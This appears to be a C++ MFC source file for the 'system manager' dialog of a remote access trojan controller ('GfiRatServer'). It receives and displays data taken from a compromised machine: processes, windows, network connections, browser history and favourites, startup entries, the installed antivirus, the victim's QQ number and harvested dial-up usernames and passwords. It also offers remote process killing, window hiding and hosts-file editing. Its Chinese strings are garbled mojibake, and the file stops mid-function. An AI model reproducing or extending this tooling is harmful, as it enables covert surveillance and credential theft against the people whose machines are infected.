// SystemDlg.cpp : implementation file
//

#include "pch.h"
#include "GfiRatServer.h"
#include "GfiRatServerDlg.h"
#include "SystemDlg.h"
#include <afxwin.h>
#include <assert.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef SIZE_T
(WINAPI
	* LocalSizeT)(
		__in HLOCAL hMem
		);

enum
{
	COMMAND_MEMOEY = 1,     //��ȡCPU�ڴ�ֵ����
	COMMAND_STOPED,       //����ֹͣ����
	TOKEN_MEMORY          //����˷��͹����ڴ�ʹ��ֵ
};

DWORD Mempszhi = 0;

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

extern int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);    //����ͼ��
CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
	m_CpuUsed = _T("0 %");
	m_MemUsed = _T("0 MB / 0 MB");
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSINFO));
	m_bClosing = FALSE;

	// 	SHFILEINFO	sfi;
	// 	SHGetFileInfo
	// 		(
	// 		"\\\\",
	// 		FILE_ATTRIBUTE_NORMAL,
	// 		&sfi,
	// 		sizeof(SHFILEINFO),
	// 		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
	// 		);
	// 	m_hIcon = sfi.hIcon;
	// 	
	// 	HIMAGELIST hImageList;
	// 	// ����ϵͳͼ���б�
	// 	hImageList = (HIMAGELIST)SHGetFileInfo
	// 		(
	// 		NULL,
	// 		0,
	// 		&sfi,
	// 		sizeof(SHFILEINFO),
	// 		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
	// 		);
	// 	m_image = CImageList::FromHandle(hImageList);
}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_EDT_HOSTS, m_edit_hosts);
	DDX_Control(pDX, IDC_INFOT, m_list_systeminfo);
	DDX_Control(pDX, IDC_LIST_PROCESST, m_list_process);
	DDX_Control(pDX, IDC_LIST_WINDOWS, m_list_windows);
	DDX_Control(pDX, IDC_LIST_4, m_list_netstate);
	DDX_Control(pDX, IDC_LIST_1, m_list_software);
	DDX_Control(pDX, IDC_LIST_DIALUPASS, m_list_dialupass);
	DDX_Control(pDX, IDC_LIST_2, m_list_iehistory);
	DDX_Control(pDX, IDC_LIST_3, m_list_iefavorite);
	DDX_Control(pDX, IDC_PROGRESS_MEMORY, m_MemPross);
	DDX_Control(pDX, IDC_PROGRESS_CPU, m_CpuPross);
	DDX_Control(pDX, IDC_TAB, m_tab);
	DDX_Text(pDX, IDC_SYSINFO_USECPU, m_CpuUsed);
	DDX_Text(pDX, IDC_SYSINFO_USEMEMORY, m_MemUsed);
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_BTN_GETHOSTS, m_gethosts);
	DDX_Control(pDX, IDC_BTN_SETHOSTS, m_sethosts);
	DDX_Control(pDX, IDC_LIST_net, m_list_net);
	DDX_Control(pDX, IDC_LIST_yingjian, m_list_yingjian);
	DDX_Control(pDX, IDC_LIST_qidong, m_list_qidong);
}

void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SYSTEMINFO:
		ShowSystemInfo();
		break;
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	case TOKEN_MEMORY:             //CPU�ڴ����ݵ���
		OnReceiveCpuMemory();
		break;
	case TOKEN_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_IHLIST:
		ShowIEHistoryList();
		break;
	case TOKEN_FULIST:
		ShowFavoritesUrlList();
		break;
	case TOKEN_NSLIST:
		ShowNetStateList();
		break;
	case TOKEN_HOSTSINFO:
		ShowHostsInfo();
	case TOKEN_NETCONFIG:
		ShowNetconfigList();
		break;
	case TOKEN_HARDWARE:
		ShowHardwareList();
		break;
	case TOKEN_STARTUP:
		ShowStartupList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}

BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_COMMAND(IDM_KILLPROCESS, OnKillProcess)
	ON_COMMAND(IDM_KILLDELETE, OnKillDelete)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshPsList)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelChangeTab)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESST, OnNMRClickListProcess)
	ON_COMMAND(ID_WINDOW_REFLUSH, OnWindowReflush)  //ˢ��
	ON_COMMAND(ID_WINDOW_CLOST, OnWindowClose)      //�ر�
	ON_COMMAND(ID_WINDOW_HIDE, OnWindowHide)        //����
	ON_COMMAND(ID_WINDOW_RETURN, OnWindowShow)      //��ԭ
	ON_COMMAND(ID_WINDOW_MAX, OnWindowMax)          //���
	ON_COMMAND(ID_WINDOW_MIN, OnWindowMin)          //��С��
	ON_NOTIFY(NM_RCLICK, IDC_INFOT, OnRclickList1)
	ON_COMMAND(ID_MENUITEM40015, OnMenuitem40015)
	ON_COMMAND(ID_MENUITEM40016, OnMenuitem40016)
	ON_COMMAND(ID_MENUITEM40017, OnMenuitem40017)
	ON_COMMAND(ID_MENUITEM40018, OnMenuitem40018)
	ON_COMMAND(ID_MENUITEM40019, OnMenuitem40019)
	ON_COMMAND(ID_MENUITEM40020, OnMenuitem40020)
	ON_BN_CLICKED(IDC_BTN_GETHOSTS, OnBtnGethosts)
	ON_BN_CLICKED(IDC_BTN_SETHOSTS, OnBtnSethosts)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WINDOWS, OnNMRClickListProcess)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DIALUPASS, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_1, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_2, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_3, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_4, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_net, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_yingjian, OnRclickList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_qidong, OnRclickList1)
	ON_EN_CHANGE(IDC_EDT_HOSTS, OnChangeEdtHosts)

END_MESSAGE_MAP()

//ȥ���ַ�������ǰ��Ŀո�
/////////////////////////////////////////////////////////////////////////////
char* DelSpace1(char* szData)
{
	int i = 0;
	while (1)
	{
		if (strnicmp(szData + i, " ", 1))
			break;
		i++;
	}
	return (szData + i);
}

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers
void CSystemDlg::ShowSystemInfo()
{
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	MESSAGEInfo m_SysInfo;
	memset(&m_SysInfo, 0, sizeof(MESSAGEInfo));
	memcpy(&m_SysInfo, lpBuffer - 1, sizeof(MESSAGEInfo));

	m_list_systeminfo.DeleteAllItems();
	m_list_systeminfo.InsertItem(0, _T("\\\\ϵͳ��Ϣ"), 0);
	m_list_systeminfo.InsertItem(1, _T("CPU_�ٶ�:"), 7);
	m_list_systeminfo.InsertItem(2, _T("CPU_��Ϣ:"), 8);
	m_list_systeminfo.InsertItem(3, _T("ϵͳ����:"), 2);
	m_list_systeminfo.InsertItem(4, _T("��½�û�:"), 11);
	m_list_systeminfo.InsertItem(5, _T("�ʱ��:"), 16);
	m_list_systeminfo.InsertItem(6, _T("��Ļ�ֱ�:"), 5);
	m_list_systeminfo.InsertItem(7, _T(""), 15);
	m_list_systeminfo.InsertItem(8, _T("\\\\�������Ϣ"), 1);
	m_list_systeminfo.InsertItem(9, _T("��������:"), 6);
	m_list_systeminfo.InsertItem(10, _T("���Ӷ˿�:"), 4);
	m_list_systeminfo.InsertItem(11, _T("��������:"), 3);
	m_list_systeminfo.InsertItem(12, _T("����;��:"), 10);
	m_list_systeminfo.InsertItem(13, _T("ɱ�����:"), 9);
	m_list_systeminfo.InsertItem(14, _T("��_Ѷ QQ:"), 17);

	char* add = DelSpace1(m_SysInfo.szCpuInfo);
	m_list_systeminfo.SetItemText(1, 1, m_SysInfo.szCpuSpeend);
	m_list_systeminfo.SetItemText(2, 1, add);
	m_list_systeminfo.SetItemText(3, 1, m_SysInfo.szPcName);
	m_list_systeminfo.SetItemText(4, 1, m_SysInfo.szUserName);
	m_list_systeminfo.SetItemText(5, 1, m_SysInfo.szActiveTime);
	m_list_systeminfo.SetItemText(6, 1, m_SysInfo.szScrSize);
	m_list_systeminfo.SetItemText(9, 1, m_SysInfo.LineName);
	m_list_systeminfo.SetItemText(10, 1, m_SysInfo.LinePort);
	m_list_systeminfo.SetItemText(11, 1, m_SysInfo.InstallOpen);
	m_list_systeminfo.SetItemText(12, 1, m_SysInfo.Program);
	m_list_systeminfo.SetItemText(13, 1, m_SysInfo.szUserVirus);
	m_list_systeminfo.SetItemText(14, 1, m_SysInfo.szQQNum);

	MESSAGEInfo* info = (MESSAGEInfo*)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
	Mempszhi = info->Memory;

	//m_MemPross.SetRange(0,(info->MemSize/1024/1024)+1);  //�ڴ��С
	m_MemPross.SetRange(0, 100);  //�ڴ��С
	m_CpuPross.SetRange(0, 100);
	m_MemPross.SetPos(0);
	m_CpuPross.SetPos(0);

	m_CpuUsed = _T("0 %");
	m_MemUsed.Format("0 MB/%d MB", Mempszhi);

	//SetTimer(1,5000,TRUE);
	//BYTE  bToken = COMMAND_MEMOEY;
	//m_iocpServer->Send(m_pContext, &bToken, 1);

	//UpdateData(false);
}

void CSystemDlg::ShowProcessList()
{
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char* szExeFileName;
	char* szProcPriority;
	char* szThreadsCount;
	char* szProcUserName;
	char* szProcMemUsed;
	char* filesize;
	char* szProcFileName;
	DWORD	dwOffset = 0;
	CString strProcessID;
	m_list_process.DeleteAllItems();

	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		szExeFileName = lpBuffer + dwOffset + sizeof(DWORD);
		szProcPriority = szExeFileName + lstrlen(szExeFileName) + 1;
		szThreadsCount = szProcPriority + lstrlen(szProcPriority) + 1;
		szProcUserName = szThreadsCount + lstrlen(szThreadsCount) + 1;
		szProcMemUsed = szProcUserName + lstrlen(szProcUserName) + 1;
		filesize= szProcMemUsed + lstrlen(szProcMemUsed) + 1; 
		szProcFileName = filesize + lstrlen(filesize) + 1;

		strProcessID.Format("%5u", *lpPID);
		//m_list_process.InsertItem(i, strExeFile, GetIconIndex(strProcessName,GetFileAttributes(strProcessName)));
		m_list_process.InsertItem(i, szExeFileName);
		m_list_process.SetItemText(i, 1, strProcessID);
		m_list_process.SetItemText(i, 2, szProcPriority);
		m_list_process.SetItemText(i, 3, szThreadsCount);
		m_list_process.SetItemText(i, 4, szProcUserName);
		m_list_process.SetItemText(i, 5, szProcMemUsed);
		m_list_process.SetItemText(i, 6, filesize);
		m_list_process.SetItemText(i, 7, szProcFileName);
		// ItemData Ϊ����ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) +
			lstrlen(szExeFileName) + 1 +
			lstrlen(szProcPriority) + 1 +
			lstrlen(szThreadsCount) + 1 +
			lstrlen(szProcUserName) + 1 +
			lstrlen(szProcMemUsed) + 1 +
			lstrlen(filesize) + 1 +
			lstrlen(szProcFileName) + 1;
	}

	strProcessID.Format("����·�� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = strProcessID.GetBuffer(0);
	lvc.cchTextMax = strProcessID.GetLength();
	m_list_process.SetColumn(7, &lvc);
}

void CSystemDlg::ShowWindowsList(void)
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	//m_list_process.DeleteAllItems();
	bool isDel = false;

	do
	{
		isDel = false;
		for (int j = 0; j < m_list_windows.GetItemCount(); j++)
		{
			CString temp = m_list_windows.GetItemText(j, 2);
			CString restr = "����";
			if (temp != restr)
			{
				m_list_windows.DeleteItem(j);
				isDel = true;
				break;
			}
		}

	} while (isDel);

	CString	str;
	int i;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = (LPDWORD)(lpBuffer + dwOffset);
		HWND* phWnd = (HWND*)(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char*)lpBuffer + dwOffset + sizeof(DWORD) + sizeof(HWND);
		str.Format("%5u", *lpPID);
		m_list_windows.InsertItem(i, str);
		str.Format("%5u", *phWnd);
		m_list_windows.SetItemText(i, 1, str);
		m_list_windows.SetItemText(i, 2, lpTitle);
		m_list_windows.SetItemText(i, 3, "��ʾ"); //(d) ������״̬��ʾΪ "��ʾ"
		// ItemData Ϊ���ھ��
		m_list_windows.SetItemData(i, (DWORD)*phWnd);  //(d)
		dwOffset += sizeof(DWORD) + sizeof(HWND) + lstrlen(lpTitle) + 1;
	}
	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_windows.SetColumn(2, &lvc);
	//	LocalFree(lpBuffer);
	//	delete [] lpBuffer;
}

void CSystemDlg::ShowDialupassList()
{
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	m_list_dialupass.DeleteAllItems();
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char* lpString = (char*)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_list_dialupass.InsertItem(i, lpString);
				else
					m_list_dialupass.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
	//	LocalFree(lpBuffer);
	//	delete [] lpBuffer;
}


BOOL CSystemDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	if (((CGfiRatServerApp*)AfxGetApp())->m_bIsQQwryExist)
	{
	
		m_SQQwry.SetPath("qqwry.dat");
	}
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - ϵͳ����", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_tab.InsertItem(0, "ϵͳ��Ϣ");
	m_tab.InsertItem(1, "���̹���");
	m_tab.InsertItem(2, "���ڹ���");
	m_tab.InsertItem(3, "��������");
	m_tab.InsertItem(4, "�����Ϣ");
	m_tab.InsertItem(5, "��������");
	m_tab.InsertItem(6, "��ʷ��¼");
	m_tab.InsertItem(7, "IE�ղؼ�");
	m_tab.InsertItem(8, "Host�ļ�");
	m_tab.InsertItem(9, "��������");
	m_tab.InsertItem(10, "Ӳ����Ϣ");
	m_tab.InsertItem(11, "������");

	m_list_systeminfo.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_systeminfo.InsertColumn(0, "����", LVCFMT_LEFT, 150);
	m_list_systeminfo.InsertColumn(1, "����", LVCFMT_LEFT, 550);

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_process.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 121);
	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, "���ȼ�", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(3, "�߳���", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(4, "�û���", LVCFMT_LEFT, 90);
	m_list_process.InsertColumn(5, "�ڴ�ʹ��", LVCFMT_LEFT, 70);
	m_list_process.InsertColumn(6, "�ļ���С", LVCFMT_LEFT, 70);
	m_list_process.InsertColumn(7, "����·��", LVCFMT_LEFT, 250);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 70);
	m_list_windows.InsertColumn(1, "���", LVCFMT_LEFT, 120);
	m_list_windows.InsertColumn(2, "��������", LVCFMT_LEFT, 300);
	m_list_windows.InsertColumn(3, "����״̬", LVCFMT_LEFT, 70);

	m_list_netstate.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_netstate.InsertColumn(0, "������", LVCFMT_LEFT, 100);
	m_list_netstate.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_netstate.InsertColumn(2, "Э��", LVCFMT_LEFT, 50);
	m_list_netstate.InsertColumn(3, "���ص�ַ:�˿�", LVCFMT_LEFT, 130);
	m_list_netstate.InsertColumn(4, "Զ�̵�ַ:�˿�", LVCFMT_LEFT, 130);
	m_list_netstate.InsertColumn(5, "Ŀ��IP������", LVCFMT_LEFT, 140);
	m_list_netstate.InsertColumn(6, "����״̬", LVCFMT_LEFT, 80);

	m_list_software.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_software.InsertColumn(0, "�������", LVCFMT_LEFT, 130);
	m_list_software.InsertColumn(1, "������", LVCFMT_LEFT, 85);
	m_list_software.InsertColumn(2, "�汾", LVCFMT_LEFT, 75);
	m_list_software.InsertColumn(3, "��װʱ��", LVCFMT_LEFT, 80);
	m_list_software.InsertColumn(4, "ж���������", LVCFMT_LEFT, 300);

	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_dialupass.InsertColumn(0, "����", LVCFMT_LEFT, 100);
	m_list_dialupass.InsertColumn(1, "�û�", LVCFMT_LEFT, 105);
	m_list_dialupass.InsertColumn(2, "����", LVCFMT_LEFT, 105);
	m_list_dialupass.InsertColumn(3, "�绰/����", LVCFMT_LEFT, 100);
	m_list_dialupass.InsertColumn(5, "�豸", LVCFMT_LEFT, 270);

	m_list_iehistory.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_iehistory.InsertColumn(0, "���", LVCFMT_LEFT, 70);
	m_list_iehistory.InsertColumn(1, "����ʱ��", LVCFMT_LEFT, 130);
	m_list_iehistory.InsertColumn(2, "����", LVCFMT_LEFT, 150);
	m_list_iehistory.InsertColumn(3, "��ҳ��ַ", LVCFMT_LEFT, 300);

	m_list_iefavorite.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_iefavorite.InsertColumn(0, "�ղ�����", LVCFMT_LEFT, 200);
	m_list_iefavorite.InsertColumn(1, "URL", LVCFMT_LEFT, 300);

	m_list_net.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_net.InsertColumn(0, "���ӷ�ʽ", LVCFMT_LEFT, 105);
	m_list_net.InsertColumn(1, "�����ַ", LVCFMT_LEFT, 130);
	m_list_net.InsertColumn(2, "IP��ַ", LVCFMT_LEFT, 100);
	m_list_net.InsertColumn(3, "��������", LVCFMT_LEFT, 100);
	m_list_net.InsertColumn(4, "���ص�ַ", LVCFMT_LEFT, 100);
	m_list_net.InsertColumn(5, "�豸����", LVCFMT_LEFT, 160);

	
	m_list_yingjian.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_yingjian.InsertColumn(0, "����", LVCFMT_LEFT, 100);
	m_list_yingjian.InsertColumn(1, "Ӳ������", LVCFMT_LEFT, 600);
	m_list_yingjian.InsertColumn(2, "Regedit Path", LVCFMT_LEFT, 600);
	

	m_list_qidong.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES);
	m_list_qidong.InsertColumn(0, "��������", LVCFMT_LEFT, 100);
	m_list_qidong.InsertColumn(1, "����·��", LVCFMT_LEFT, 200);
	m_list_qidong.InsertColumn(2, "��ֵ", LVCFMT_LEFT, 250);



	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_FATHER_ICON));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_001));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_002));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_003));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_004));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_005));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_006));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_007));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_008));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_009));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSICO_010));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L1));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L2));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L3));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L4));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_TIME));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_qq));
	m_list_systeminfo.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICOINFO_PROCESS));
	m_list_process.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICOINFO_APPWIN));
	m_list_windows.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L4));
	m_list_netstate.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L1));
	m_list_software.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_DOUBLE));
	m_list_dialupass.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L2));
	m_list_iehistory.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_ImgList.Detach();
	m_ImgList.Create(16, 16, ILC_COLOR8 | ILC_MASK, 15, 1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_L3));
	m_list_iefavorite.SetImageList(&m_ImgList, LVSIL_SMALL);

	m_list_net.SetImageList(&m_ImgList, LVSIL_SMALL);
	m_list_yingjian.SetImageList(&m_ImgList, LVSIL_SMALL);
	m_list_qidong.SetImageList(&m_ImgList, LVSIL_SMALL);


	CRect rectClient;
	GetClientRect(&rectClient);
	m_gethosts.MoveWindow(rectClient.right - 300, rectClient.bottom - 30, 70, 24);
	m_sethosts.MoveWindow(rectClient.right - 200, rectClient.bottom - 30, 70, 24);
	AdjustList();
	ShowSystemInfo();
	//	GetCpuMemory();
	ShowSelectWindow(TRUE);
	GetSystemInfo();
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

// �����ݵ���ˢ��CPU���ڴ���ʾ
void CSystemDlg::OnReceiveCpuMemory(void)
{
	DWORD d = 0;
	memcpy((void*)&d, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(DWORD));
	int i, j;
	m_MemPross.GetRange(i, j);
	//i = j - ((d / 1024 / 1024) + 1);
	i = Mempszhi * d / 100;
	m_MemPross.SetPos(d);
	m_MemUsed.Format("%d MB/%d MB   %d %%", i, Mempszhi, (int)round((float) i/ (float)Mempszhi*100));

	//////////////// CPU//////////////////////////////////////////////////////////
	memcpy((void*)&d, m_pContext->m_DeCompressionBuffer.GetBuffer(1) + sizeof(DWORD), sizeof(DWORD));
	m_CpuPross.SetPos(d);
	m_CpuUsed.Format("%d %%", d);
	if (!m_bClosing)
	{
		SetDlgItemText(IDC_SYSINFO_USECPU, m_CpuUsed);
		SetDlgItemText(IDC_SYSINFO_USEMEMORY, m_MemUsed);
	}
}

BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && ((pMsg->wParam == VK_RETURN && pMsg->hwnd != m_edit_hosts.m_hWnd) || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose()
{

	m_bClosing = TRUE;
	// 	BYTE  bToken = COMMAND_STOPED;
	// 	m_iocpServer->Send(m_pContext, &bToken, 1);  //����CPU �ڴ� ֹͣ�ź�
	// 	ShowWindow(SW_HIDE);
	// 	Sleep(1000);
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	AdjustList();
}

void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	if (!m_tab.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectClient.top = 11;
	m_tab.MoveWindow(&rectClient);

	m_list_systeminfo.SetParent(&m_tab);
	m_list_process.SetParent(&m_tab);
	m_list_windows.SetParent(&m_tab);
	m_list_netstate.SetParent(&m_tab);
	m_list_software.SetParent(&m_tab);
	m_list_dialupass.SetParent(&m_tab);
	m_list_iehistory.SetParent(&m_tab);
	m_list_iefavorite.SetParent(&m_tab);
	m_list_net.SetParent(&m_tab);
	m_list_yingjian.SetParent(&m_tab);
	m_list_qidong.SetParent(&m_tab);
	m_edit_hosts.SetParent(&m_tab);

	m_tab.GetClientRect(&rectClient);
	m_tab.AdjustRect(FALSE, &rectClient);
	rectClient.left -= 4;
	rectClient.top -= 2;
	rectClient.right += 4;
	rectClient.bottom += 2;
	m_list_process.MoveWindow(&rectClient);
	m_list_windows.MoveWindow(&rectClient);
	m_list_netstate.MoveWindow(&rectClient);
	m_list_software.MoveWindow(&rectClient);
	m_list_dialupass.MoveWindow(&rectClient);
	m_list_iehistory.MoveWindow(&rectClient);
	m_list_iefavorite.MoveWindow(&rectClient);
	m_list_net.MoveWindow(&rectClient);
	m_list_yingjian.MoveWindow(&rectClient);
	m_list_qidong.MoveWindow(&rectClient);
	rectClient.bottom -= 115;
	m_list_systeminfo.MoveWindow(&rectClient);
	rectClient.bottom += 84;
	m_edit_hosts.MoveWindow(&rectClient);
	GetClientRect(&rectClient);
	m_gethosts.MoveWindow(rectClient.right-300, rectClient.bottom-30, 70, 24);
	m_sethosts.MoveWindow(rectClient.right-200, rectClient.bottom-30, 70, 24);
}

void CSystemDlg::ShowSelectWindow(BOOL bInit)
{
	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list_systeminfo.ShowWindow(SW_SHOW); //ϵͳ��Ϣ
		m_list_process.ShowWindow(SW_HIDE);    //���̹���
